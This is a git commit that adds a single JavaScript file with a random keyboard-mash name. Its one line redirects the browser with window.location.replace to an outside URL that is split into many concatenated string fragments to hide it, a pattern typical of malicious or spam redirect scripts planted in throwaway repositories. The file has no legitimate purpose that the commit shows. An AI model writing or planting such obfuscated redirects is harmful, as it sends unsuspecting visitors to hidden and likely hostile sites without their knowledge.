bc83160b2c54461270cd1e90774d54e1a731c8cf
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-12-04 14:45:44 +0100

    Create rdthdtyjsdgtrfjdthfghrsdjhtg.js

---
+++ rdthdtyjsdgtrfjdthfghrsdjhtg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://w`,`ww.ro`,`adswo`,`rks.c`,`om/gQ_hBE`,`IKQRfu`,`gBl4S`,`r-C7Mp`,`V8z9`,`GjtGhZ`,`4JRNOl`,`A74ysO`,`MDJcq-4`,`4yhelP`,`98KKGu`,`1mcL5G`,`1500vX`,`mfHdM`,`_GumA~~/TA`,`HA/6oX8CQQ47s`,`PPP2`))
